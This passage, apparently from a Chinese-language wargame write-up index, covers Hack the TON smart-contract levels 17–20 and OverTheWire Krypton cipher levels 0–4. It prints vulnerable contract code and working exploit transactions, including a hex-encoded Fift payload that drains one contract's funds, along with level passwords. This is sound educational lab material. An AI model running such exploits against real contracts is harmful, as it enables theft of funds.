assert(isSliceBitsEqual(senderAddress, ctxOwner), 503); val to: slice = inMsgBody.loadAddress(); val amount: int = inMsgBody.loadInt(256); ctxTotalSupply += amount; ctxBalances = mint(ctxBalances, to, amount); saveData(); return; } if (op == OP_TRANSFER) { val to: slice = inMsgBody.loadAddress(); val amount: int = inMsgBody.loadInt(256); ctxBalances = transfer(ctxBalances, senderAddress, to, amount); saveData(); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get owner(): slice { loadData(); return ctxOwner; } get balanceOf(account: slice): int { loadData(); return getBalance(ctxBalances, account); } get totalSupply(): int { loadData(); return ctxTotalSupply; } \u9700\u8981\u8ba9\u4ee3\u5e01\u4f59\u989d\u4e0e\u603b\u4f9b\u5e94\u91cf\u76f8\u540c 1 2 3 4 5 6 // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"token\").endCell()) .storeBool(getBalance(ctxBalances, ctxPlayer) == ctxTotalSupply) .endCell(); \u83b7\u53d6\u521d\u59cb\u6570\u636e 1 2 3 4 > await contract . getTotalSupply (); 1000000n > await contract . getBalanceOf ( player . address ); 0n \u521d\u59cb\u4ee3\u5e01\u4f59\u989d\u4e3a 0\u3002\u64cd\u4f5c OP_TRANSFER \u4f7f\u7528 loadInt() \u89e3\u6790\u8981\u8f6c\u79fb\u7684\u4ee3\u5e01\u6570\u91cf\uff0c\u5373 amount \u53ef\u4ee5\u4e3a\u8d1f\u6570\uff0c\u80fd\u591f\u589e\u52a0\u53d1\u9001\u8005\u7684\u4ee3\u5e01\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if (op == OP_TRANSFER) { val to: slice = inMsgBody.loadAddress(); val amount: int = inMsgBody.loadInt(256); ctxBalances = transfer(ctxBalances, senderAddress, to, amount); saveData(); return; } fun transfer(balances: cell, from: slice, to: slice, amount: int): cell { // ... fromBalance -= amount; toBalance += amount; assert(fromBalance > 0, 502); // ... } \u8fdb\u884c\u4ee3\u5e01\u8f6c\u79fb 1 > await contract . send ( player , beginCell (). storeUint ( 0x3ee943f1 , 32 ). storeAddress ( contract . address ). storeInt ( - 1000000n , 256 ). endCell (), toNano ( \"0.02\" ));","title":"17. TOKEN"},{"location":"wargames/hack_the_ton/#18-jackpot","text":"You will beat this level if you manage to reduce its balance to 0. Jackpot 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 #include \"../imports/stdlib.fc\" ; ;; storage variables global slice ctx_player ; global int ctx_nonce ; global cell ctx_balances ; ;; load_data populates storage variables using stored data () load_data () impure { var ds = get_data (). begin_parse (); ctx_player = ds ~ load_msg_addr (); ctx_nonce = ds ~ load_uint ( 32 ); ctx_balances = ds ~ load_dict (); ds . end_parse (); } ;; save_data stores storage variables as a cell into persistent storage () save_data () impure { set_data ( begin_cell () . store_slice ( ctx_player ) . store_uint ( ctx_nonce , 32 ) . store_dict ( ctx_balances ) . end_cell () ); } ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts () recv_internal ( int my_balance , int msg_value , cell in_msg_full , slice in_msg_body ) impure { if ( in_msg_body . slice_empty ? ()) { ;; ignore all empty messages return (); } slice cs = in_msg_full . begin_parse (); int flags = cs ~ load_uint ( 4 ); if ( flags & 1 ) { ;; ignore all bounced messages return (); } slice sender_address = cs ~ load_msg_addr (); ( int wc , int sender ) = parse_std_addr ( sender_address ); throw_unless ( 501 , wc == 0 ); load_data (); ;; here we populate the storage variables int op = in_msg_body ~ load_uint ( 32 ); ;; by convention , the first 32 bits of incoming message is the op if ( equal_slice_bits ( in_msg_body , \"check\" )) { ;; receive \"check\" message ;; send CheckLevelResult msg cell msg_body = begin_cell () . store_uint ( 0x6df37b4d , 32 ) . store_ref ( begin_cell (). store_slice ( \"jackpot\" ). end_cell ()) . store_int ( my_balance - msg_value == 0 , 1 ) . end_cell (); builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( 0 ) . store_uint ( 1 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . store_ref ( msg_body ); ;; send all the remaining value send_raw_message ( msg . end_cell (), 64 ); return (); } if ( op == 0 ) { ;; deposit int fee = 10000000 ; int balance = max ( msg_value - fee , 0 ); ( _ , slice old_balance_slice , int found ? ) = ctx_balances . udict_delete_get ? ( 256 , sender ); if ( found ? ) { balance += old_balance_slice ~ load_coins (); } ctx_balances ~ udict_set_builder ( 256 , sender , begin_cell (). store_coins ( balance )); save_data (); return (); } if ( op == 1 ) { ;; withdraw ( _ , slice old_balance_slice , int found ? ) = ctx_balances . udict_delete_get ? ( 256 , sender ); throw_unless ( 502 , found ? ); int balance = old_balance_slice ~ load_coins (); int withdraw_amount = in_msg_body ~ load_coins (); throw_unless ( 503 , balance >= withdraw_amount ); balance -= withdraw_amount ; if ( balance > 0 ) { ctx_balances ~ udict_set_builder ( 256 , sender , begin_cell (). store_coins ( balance )); } var msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( withdraw_amount ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . end_cell (); send_raw_message ( msg , 64 + 2 ); save_data (); return (); } throw ( 0xffff ); ;; if the message contains an op that is not known to this contract , we throw } ;; get methods are a means to conveniently read contract data using , for example , HTTP APIs ;; they are marked with method_id ;; note that unlike in many other smart contract VMs , get methods cannot be called by other contracts int balance_of ( slice account_address ) method_id { load_data (); ( _ , int account ) = parse_std_addr ( account_address ); ( slice value , int found ? ) = ctx_balances . udict_get ? ( 256 , account ); ifnot ( found ? ) { return 0 ; } return value ~ load_coins (); } int balance () method_id { [ int value , _ ] = get_balance (); return value ; } \u64cd\u4f5c withdraw \u4f7f\u7528\u4e86\u975e\u4fee\u6539\u65b9\u6cd5 udict_delete_get? \u83b7\u53d6\u4e86\u65e7\u7684\u4f59\u989d\uff0c\u4f46\u4fee\u6539\u540e\u7684\u5b57\u5178\u6ca1\u6709\u8d4b\u503c\u7ed9 ctx_balances \u3002\u5982\u679c withdraw_amount \u6070\u597d\u7b49\u4e8e balance \uff0c ctx_balances \u5c06\u4e0d\u4f1a\u88ab\u66f4\u65b0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 if ( op == 1 ) { ;; withdraw ( _ , slice old_balance_slice , int found ? ) = ctx_balances . udict_delete_get ? ( 256 , sender ); throw_unless ( 502 , found ? ); int balance = old_balance_slice ~ load_coins (); int withdraw_amount = in_msg_body ~ load_coins (); throw_unless ( 503 , balance >= withdraw_amount ); balance -= withdraw_amount ; if ( balance > 0 ) { ctx_balances ~ udict_set_builder ( 256 , sender , begin_cell (). store_coins ( balance )); } ;; [...] save_data (); return (); } \u53ef\u4ee5\u5728\u4e00\u6b21 deposit \u4e4b\u540e\uff0c\u8fdb\u884c\u591a\u6b21 withdraw 1 2 3 4 5 6 7 8 9 10 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). endCell (), toNano ( \"0.05\" )); > await contract . getBalanceOf ( player . address ); 40000000n > await contract . send ( player , beginCell (). storeUint ( 1 , 32 ). storeCoins ( 40000000n ). endCell (), toNano ( \"0.05\" )); // \u6839\u636e\u5408\u7ea6\u4f59\u989d\u51b3\u5b9a\u63a5\u4e0b\u6765\u7684 withdraw_amount > await contract . getBalance (); 1423502n > await contract . send ( player , beginCell (). storeUint ( 1 , 32 ). storeCoins ( 1423482n ). endCell (), toNano ( \"0.05\" )); // \u9700\u8981\u7559\u4e00\u90e8\u5206\u5408\u7ea6\u4f59\u989d\u7528\u4e8e\u4ea4 storage fee\uff0c\u5426\u5219\u8f6c\u51fa\u6d88\u606f\u4f1a\u53d1\u9001\u5931\u8d25 // https://testnet.tonviewer.com/transaction/f422227642e7cb91d4e730df9324b83905e724f19c6488d009480bbd0fde66b0","title":"18. JACKPOT"},{"location":"wargames/hack_the_ton/#19-proxy","text":"You will beat this level if you manage to disable this proxy contract. Proxy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxOwner: slice; global ctxEnabled: bool; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxOwner = ds.loadAddress(); ctxEnabled = ds.loadBool(); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeSlice(ctxOwner) .storeBool(ctxEnabled) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); cs.skipBits(4); val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"proxy\").endCell()) .storeBool(!ctxEnabled) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == 0) { assert(ctxEnabled, 501); val targetAddress: slice = inMsgBody.loadAddress(); val msgBody: cell = inMsgBody.loadRef(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(targetAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); } else { assert(isSliceBitsEqual(senderAddress, ctxOwner), 502); ctxEnabled = inMsgBody.loadBool(); saveData(); } } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get owner(): slice { loadData(); return ctxOwner; } get enabled(): bool { loadData(); return ctxEnabled; } \u9898\u76ee\u8981\u6c42\u5c06 ctxEnabled \u8bbe\u7f6e\u4e3a false \uff0c\u4f46\u53ea\u6709\u5408\u7ea6\u6240\u6709\u8005\u80fd\u591f\u8bbe\u7f6e\uff0c\u800c\u6240\u6709\u8005\u4e3a\u96f6\u5730\u5740 1 2 > ( await contract . getOwner ()). toString (); EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c \u5728 ctxEnabled \u4e3a true \u65f6\uff0c\u64cd\u4f5c 0 \u53ef\u4ee5\u5411\u4efb\u610f\u5730\u5740\u53d1\u9001\u4efb\u610f\u6d88\u606f\uff0c\u53ef\u4ee5\u7528\u4e8e\u76f4\u63a5\u53d1\u9001 check \u6d88\u606f \u53ef\u4ee5\u5148\u6267\u884c\u4e00\u6b21 CHECK SOLUTION \uff0c\u4ee5\u786e\u5b9a \u76ee\u6807\u5730\u5740 \u53d1\u9001 check \u6d88\u606f 1 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). storeAddress ( Address . parse ( \"kQDL370ftqHMY7NcopQb2H9fs7AjkqepO9nPtJXdLSmx6Bvw\" )). storeRef ( beginCell (). storeUint ( 0x6df37b4d , 32 ). storeRef ( beginCell (). storeStringTail ( \"proxy\" ). endCell ()). storeUint ( 1 , 1 ). endCell ()). endCell (), toNano ( \"0.05\" )); \u53e6\u5916\uff0c\u7531\u4e8e onInternalMessage() \u6ca1\u6709\u68c0\u67e5\u6536\u5230\u7684\u6d88\u606f\u662f\u5426\u662f\u5f39\u56de\u6d88\u606f\uff0c\u4e5f\u53ef\u4ee5\u5411\u96f6\u5730\u5740\u53d1\u9001\u6d88\u606f\uff0c\u5e76\u501f\u52a9\u5f39\u56de\u6d88\u606f\u8bbe\u7f6e ctxEnabled 1 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). storeAddress ( await contract . getOwner ()). storeRef ( beginCell (). storeUint ( 1 , 32 ). endCell ()). endCell (), toNano ( \"0.05\" ));","title":"19. PROXY"},{"location":"wargames/hack_the_ton/#references_6","text":"Transfer With a Comment","title":"References"},{"location":"wargames/hack_the_ton/#20-execution","text":"You will beat this level if you manage to reduce its balance to 0. Execution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 import \"@stdlib/tvm-lowlevel\" // storage variables global ctxPlayer: slice; global ctxNonce: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .endCell() ); } // this asm actually do nothing on TVM level, but force compiler to think that // typeless continuation is actually () to int function @pure fun castToFunction(c: continuation): (() -> int) asm \"NOP\"; // put cell to c5 (we need it to clean register) fun setC5(c: cell): void asm \"c5 POPCTR\"; // this asm gets function as an argument // then it passes it to \"wrapper\" and execute wrapper with \"1 1 CALLXARGS\" // that means move to wrapper stack 1 element and then return 1 element. // wrapper itself try to execute function but catches exceptions, also it checks that // after execution there is at least 1 element on stack via `DEPTH 2 THROWIFNOT`. // if function didn't throw, wrapper returns it's result, otherwise it returns NULL from CATCH statement @pure fun tryExecute(guesser: (() -> int)): int asm \"<{ TRY:<{ EXECUTE DEPTH 2 THROWIFNOT }>CATCH<{ 2DROP NULL }> }>CONT\" \"1 1 CALLXARGS\"; // we do not trust function which we test: it may try to send messages or do other nasty things // so we wrap it to the function which save register values prior to execution // and restores them after @inline fun safeExecute(guesser: (() -> int)): int { val c4: cell = getContractData(); val result: int = tryExecute(guesser); // restore c4 if guesser spoiled it setContractData(c4); // clean actions if guesser spoiled them setC5(beginCell().endCell()); return result; } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"execution\").endCell()) .storeBool(myBalance - msgValue == 0) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == 0) { val code: cell = inMsgBody.loadRef(); val guesser = castToFunction(code.beginParse().transformSliceToContinuation()); randomizeByLogicalTime(); val randomNumber: int = random(); val guess: int = safeExecute(guesser); assert(randomNumber == guess, 501); val msg = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1) .endCell(); // send all the contract balance sendRawMessage(msg, 128); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } get balance(): int { val [value, _] = getMyOriginalBalanceWithExtraCurrencies(); return value; } \u901a\u8fc7\u64cd\u4f5c 0 \u4e2d\u7684\u68c0\u67e5\u5373\u80fd\u6e05\u7a7a\u5408\u7ea6\u6240\u6301\u6709\u7684 TON \u64cd\u4f5c 0 \u80fd\u591f\u5c06\u53d1\u9001\u8005\u63d0\u4f9b\u7684\u4ee3\u7801\u4f5c\u4e3a\u65e0\u8f93\u5165\u8fd4\u56de\u503c\u7c7b\u578b\u4e3a int \u7684\u51fd\u6570\u6267\u884c\uff0c\u4e14\u8981\u6ee1\u8db3\u8fd4\u56de\u503c\u4e0e randomNumber \u76f8\u540c \u4f46\u662f\u64cd\u4f5c 0 \u5df2\u7ecf\u8c03\u7528\u4e00\u6b21 randomizeByLogicalTime() \u968f\u673a\u5316\u4e86\u79cd\u5b50\uff0c\u56e0\u800c\u65e0\u6cd5\u901a\u8fc7\u6267\u884c\u76f8\u540c\u7684\u4ee3\u7801\u6765\u83b7\u53d6\u76f8\u540c\u7684\u968f\u673a\u6570\u3002\u4e0d\u8fc7\uff0c\u5c3d\u7ba1 safeExecute() \u5728\u8c03\u7528\u5b8c tryExecute() \u540e\u4f1a\u91cd\u7f6e\u5bc4\u5b58\u5668 c4 \u548c c5 \uff0c\u4f46\u7531\u4e8e\u6ca1\u6709 commit \uff0c\u540e\u7eed\u6267\u884c\u5982\u679c\u629b\u51fa\u9519\u8bef\uff0c\u4fee\u6539\u5c06\u4f1a\u88ab\u56de\u6eda\u3002\u56e0\u6b64\uff0c\u7528\u6237\u81ea\u5b9a\u4e49\u7684 guesser() \u51fd\u6570\u5b9e\u9645\u4e0a\u53ef\u4ee5\u76f4\u63a5\u53d1\u9001\u6a21\u5f0f\u4e3a 128 \u7684\u6d88\u606f\uff0c\u5e76\u8c03\u7528 commit() \u63d0\u4ea4\u5f53\u524d c4 \u3001 c5 \u5bc4\u5b58\u5668\u7684\u72b6\u6001\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 \"Asm.fif\" include \"TonUtil.fif\" include <{ <b 0x18 6 u, \"0QAHpxVbUO9IXraTMeTmqWNFenGg00qWDnTjhyR0HdsnsCrL\" $>smca 2drop Addr, 0 Gram, 0 107 u, b> // \u6784\u5efa\u6d88\u606f\u4f53 PUSHREF 128 PUSHINT SENDRAWMSG COMMIT 1 PUSHINT // \u4f5c\u4e3a\u8fd4\u56de\u503c }>s s>c boc>B Bx. // \u8f93\u51fa\u7ed3\u679c \u7f16\u8bd1\u4ee3\u7801 1 $ fift func.fif -I libs/ \u53d1\u9001\u4ea4\u6613 1 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). storeRef ( Cell . fromHex ( \"B5EE9C7201010201003E00011288810080FB00F80F71010060620003D38AADA877A42F5B4998F27354B1A2BD38D069A54B073A71C3923A0EED93D80000000000000000000000000000\" )). endCell (), toNano ( \"0.05\" ));","title":"20. EXECUTION"},{"location":"wargames/hack_the_ton/#references_7","text":"bless Introduction To Fift Fift deep dive Fift: A Brief Introduction Telegram Open Network Virtual Machine","title":"References"},{"location":"wargames/krypton/","text":"Level 0 \u00b6 1 2 $ echo S1JZUFRPTklTR1JFQVQ = | base64 --decode KRYPTONISGREAT Level 1 \u00b6 Username krypton1 Password KRYPTONISGREAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ ssh krypton1@krypton.labs.overthewire.org -p 2231 $ ls /krypton krypton1 krypton2 krypton3 krypton4 krypton5 krypton6 $ ls /krypton/krypton1 krypton2 README $ cat /krypton/krypton1/README Welcome to Krypton! This game is intended to give hands on experience with cryptography and cryptanalysis. The levels progress from classic ciphers, to modern, easy to harder. Although there are excellent public tools, like cryptool,to perform the simple analysis, we strongly encourage you to try and do these without them for now. We will use them in later excercises. ** Please try these levels without cryptool first ** The first level is easy. The password for level 2 is in the file 'krypton2' . It is 'encrypted' using a simple rotation called ROT13. It is also in non-standard ciphertext format. When using alpha characters for cipher text it is normal to group the letters into 5 letter clusters, regardless of word boundaries. This helps obfuscate any patterns. This file has kept the plain text word boundaries and carried them to the cipher text. Enjoy! $ cd /krypton/krypton1 $ cat krypton2 | tr 'a-zA-Z' 'n-za-mN-ZA-M' LEVEL TWO PASSWORD ROTTEN Level 2 \u00b6 Username krypton2 Password ROTTEN 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 $ ssh krypton2@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton2 $ ls encrypt keyfile.dat krypton3 README $ cat README Krypton 2 ROT13 is a simple substitution cipher. Substitution ciphers are a simple replacement algorithm. In this example of a substitution cipher, we will explore a 'monoalphebetic' cipher. Monoalphebetic means, literally, \"one alphabet\" and you will see why. This level contains an old form of cipher called a 'Caesar Cipher' . A Caesar cipher shifts the alphabet by a set number. For example: plain: a b c d e f g h i j k ... cipher: G H I J K L M N O P Q ... In this example, the letter 'a' in plaintext is replaced by a 'G' in the ciphertext so, for example, the plaintext 'bad' becomes 'HGJ' in ciphertext. The password for level 3 is in the file krypton3. It is in 5 letter group ciphertext. It is encrypted with a Caesar Cipher. Without any further information, this cipher text may be difficult to break . You do not have direct access to the key, however you do have access to a program that will encrypt anything you wish to give it using the key. If you think logically, this is completely easy. One shot can solve it! Have fun. Additional Information: The ` encrypt ` binary will look for the keyfile in your current working directory. Therefore, it might be best to create a working direcory in /tmp and in there a link to the keyfile. As the ` encrypt ` binary runs setuid ` krypton3 ` , you also need to give ` krypton3 ` access to your working directory. Here is an example: krypton2@melinda:~$ mktemp -d /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:~$ cd /tmp/tmp.Wf2OnCpCDQ krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ln -s /krypton/krypton2/keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls keyfile.dat krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ chmod 777 . krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ /krypton/krypton2/encrypt /etc/issue krypton2@melinda:/tmp/tmp.Wf2OnCpCDQ$ ls ciphertext keyfile.dat $ cat krypton3 OMQEMDUEQMEK $ ./encrypt usage: encrypt foo - where foo is the file containing the plaintext $ mktemp -d /tmp/tmp.aHZs9AbfRo $ cd /tmp/tmp.aHZs9AbfRo $ ln -s /krypton/krypton2/keyfile.dat $ chmod 777 . $ echo abcABC > test $ /krypton/krypton2/encrypt test $ cat ciphertext MNOMNO $ cd /krypton/krypton2 $ cat krypton3 | tr 'A-Z' 'O-ZA-N' CAESARISEASY Level 3 \u00b6 Username krypton3 Password CAESARISEASY 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 $ ssh krypton3@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton3 $ ls found1 found2 found3 HINT1 HINT2 krypton4 README $ cat README Well done . You\u2018ve moved past an easy substitution cipher. Hopefully you just encrypted the alphabet a plaintext to fully expose the key in one swoop. The main weakness of a simple substitution cipher is repeated use of a simple key. In the previous exercise you were able to introduce arbitrary plaintext to expose the key. In this example, the cipher mechanism is not available to you, the attacker. However, you have been lucky. You have intercepted more than one message. The password to the next level is found in the file 'krypton4' . You have also found 3 other files. ( found1, found2, found3 ) You know the following important details: - The message plaintexts are in English ( *** very important ) - They were produced from the same key ( *** even better! ) Enjoy. $ cat HINT1 Some letters are more prevalent in English than others. $ cat HINT2 \"Frequency Analysis\" is your friend. $ cat found1 CGZNL YJBEN QYDLQ ZQSUQ NZCYD SNQVU BFGBK GQUQZ QSUQN UZCYD SNJDS UDCXJ ZCYDS NZQSU QNUZB WSBNZ QSUQN UDCXJ CUBGS BXJDS UCTYV SUJQG WTBUJ KCWSV LFGBK GSGZN LYJCB GJSZD GCHMS UCJCU QJLYS BXUMA UJCJM JCBGZ CYDSN CGKDC ZDSQZ DVSJJ SNCGJ DSYVQ CGJSO JCUNS YVQZS WALQV SJJSN UBTSX COSWG MTASN BXYBU CJCBG UWBKG JDSQV YDQAS JXBNS OQTYV SKCJD QUDCX JBXQK BMVWA SNSYV QZSWA LWAKB MVWAS ZBTSS QGWUB BGJDS TSJDB WCUGQ TSWQX JSNRM VCMUZ QSUQN KDBMU SWCJJ BZBTT MGCZQ JSKCJ DDCUE SGSNQ VUJDS SGZNL YJCBG UJSYY SNXBN TSWAL QZQSU QNZCY DSNCU BXJSG CGZBN YBNQJ SWQUY QNJBX TBNSZ BTYVS OUZDS TSUUM ZDQUJ DSICE SGNSZ CYDSN QGWUJ CVVDQ UTBWS NGQYY VCZQJ CBGCG JDSNB JULUJ STQUK CJDQV VUCGE VSQVY DQASJ UMAUJ CJMJC BGZCY DSNUJ DSZQS UQNZC YDSNC USQUC VLANB FSGQG WCGYN QZJCZ SBXXS NUSUU SGJCQ VVLGB ZBTTM GCZQJ CBGUS ZMNCJ LUDQF SUYSQ NSYNB WMZSW TBUJB XDCUF GBKGK BNFAS JKSSG QGWDC USQNV LYVQL UKSNS TQCGV LZBTS WCSUQ GWDCU JBNCS UESGN SUDSN QCUSW JBJDS YSQFB XUBYD CUJCZ QJCBG QGWQN JCUJN LALJD SSGWB XJDSU COJSS GJDZS GJMNL GSOJD SKNBJ STQCG VLJNQ ESWCS UMGJC VQABM JCGZV MWCGE DQTVS JFCGE VSQNQ GWTQZ ASJDZ BGUCW SNSWU BTSBX JDSXC GSUJS OQTYV SUCGJ DSSGE VCUDV QGEMQ ESCGD CUVQU JYDQU SDSKN BJSJN QECZB TSWCS UQVUB FGBKG QUNBT QGZSU QGWZB VVQAB NQJSW KCJDB JDSNY VQLKN CEDJU TQGLB XDCUY VQLUK SNSYM AVCUD SWCGS WCJCB GUBXI QNLCG EHMQV CJLQG WQZZM NQZLW MNCGE DCUVC XSJCT SQGWC GJKBB XDCUX BNTSN JDSQJ NCZQV ZBVVS QEMSU YMAVC UDSWJ DSXCN UJXBV CBQZB VVSZJ SWSWC JCBGB XDCUW NQTQJ CZKBN FUJDQ JCGZV MWSWQ VVAMJ JKBBX JDSYV QLUGB KNSZB EGCUS WQUUD QFSUY SQNSU \u867d\u7136\u5bc6\u6587\u5206\u7ec4\u4e86\uff0c\u4f46\u4ecd\u7136\u662f\u5355\u8868\u4ee3\u6362\u3002\u8bcd\u9891\u5206\u6790\u5c31\u4ea4\u7ed9 quipqiup \u597d\u5566 \u9009\u62e9\u4efb\u610f\u4e00\u4e2a found \u6587\u4ef6\u5185\u5bb9\u52a0\u4e0a krypton4 \u7684\u6587\u4ef6\u5185\u5bb9\u5c31\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\uff1a WELL DONE THE LEVEL FOUR PASSWORD IS BRUTE Level 4 \u00b6 Username krypton4 Password BRUTE 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 $ ssh krypton4@krypton.labs.overthewire.org -p 2231 $ cd /krypton/krypton4 $ ls found1 found2 HINT krypton5 README $ cat README | iconv -f ISO8859-1 -t UTF-8 Good job! You more than likely used frequency analysis and some common sense to solve that one. So far we have worked with simple substitution ciphers. They have also been 'monoalphabetic' , meaning using a fixed key, and giving a one to one mapping of plaintext ( P ) to ciphertext ( C ) . Another type of substitution cipher is referred to as 'polyalphabetic' , where one character of P may map to many, or all, possible ciphertext characters. An example of a polyalphabetic cipher is called a Vigen\u00e8re Cipher. It works like this: If we use the key ( K ) 'GOLD' , and P = PROCEED MEETING AS AGREED, then \"add\" P to K, we get C. When adding, if we exceed 25 , then we roll to 0 ( modulo 26 ) . P P R O C E E D M E E T I N G A S A G R E E D K G O L D G O L D G O L D G O L D G O L D G O becomes: P 15 17 14 2 4 4 3 12 4 4 19 8 13 6 0 18 0 6 17 4 4 3 K 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 11 3 6 14 C 21 5 25 5 10 18 14 15 10 18 4 11 19 20 11 21 6 20 2 8 10 17 So, we get a ciphertext of: VFZFK SOPKS ELTUL VGUCH KR This level is a Vigen\u00e8re Cipher. You have intercepted two longer, english language messages. You also have a key piece of information. You know the key length! For this exercise, the key length is 6 . The password to level five is in the usual place, encrypted with the 6 letter key. Have fun! $ cat HINT Frequency analysis will still work, but you need to analyse it by \"keylength\" . Analysis of cipher text at position 1 , 6 , 12 , etc should reveal the 1st letter of the key, in this case . Treat this as 6 different mono-alphabetic ciphers... Persistence and some good guesses are the key! $ cat found1 YYICS JIZIB AGYYX RIEWV IXAFN JOOVQ QVHDL CRKLB SSLYX RIQYI IOXQT WXRIC 